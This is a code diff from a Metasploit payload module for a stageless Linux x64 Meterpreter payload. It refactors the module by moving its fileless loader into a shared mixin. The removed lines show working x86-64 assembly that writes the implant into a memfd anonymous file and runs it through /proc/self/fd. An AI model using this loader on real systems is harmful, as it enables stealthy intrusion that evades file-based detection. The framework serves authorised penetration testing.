@@ -10,7 +10,7 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
-
+  include Msf::Payload::Linux::X64::MeterpreterLoader
   def initialize(info = {})
     super(
       update_info(
@@ -37,59 +37,6 @@ module MetasploitModule
       stageless: true
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('x86_64-linux-musl', generate_config(opts)).to_binary :exec
-    in_memory_loader_asm = %Q^
-    start:
-      xor rsi, rsi
-      push rsi
-      lea rdi, [rsp]
-      inc rsi
-      mov rax, 0x13F
-      syscall                           ; memfd_create("", MFD_CLOEXEC);
-      mov rdi, rax
-      jmp get_payload
-    got_payload:
-      pop rsi
-      mov rdx, #{payload.length}
-      xor rax, rax
-      inc rax
-      syscall                            ; write(fd, elfbuffer, elfbuffer_len);
-      jmp get_command
-    got_command:
-      pop rbx
-      mov rcx, 18
-      mov rax, rdi
-    itoa:
-      test rax, rax
-      jz fixpath
-      mov rdx, 10
-      div dl
-      mov rdx, rax
-      shr rdx, 8
-      and rax, 255
-      add rdx, 48
-      mov byte [rbx + rcx], dl
-      dec rcx
-      jmp itoa
-    fixpath:
-      cmp rcx, 13
-      je execve
-      mov byte [rbx + rcx], '/'
-      dec rcx
-      jmp fixpath
-    execve:
-      mov rdi, rbx
-      xor rdx, rdx
-      xor rsi, rsi
-      mov eax, 0x3b
-      syscall                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
-
-    get_command:
-      call got_command
-      db "/proc/self/fd/", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-    get_payload:
-      call got_payload
-    ^
-    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
-    in_memory_loader + payload
+    in_memory_load(payload) + payload
   end
 end
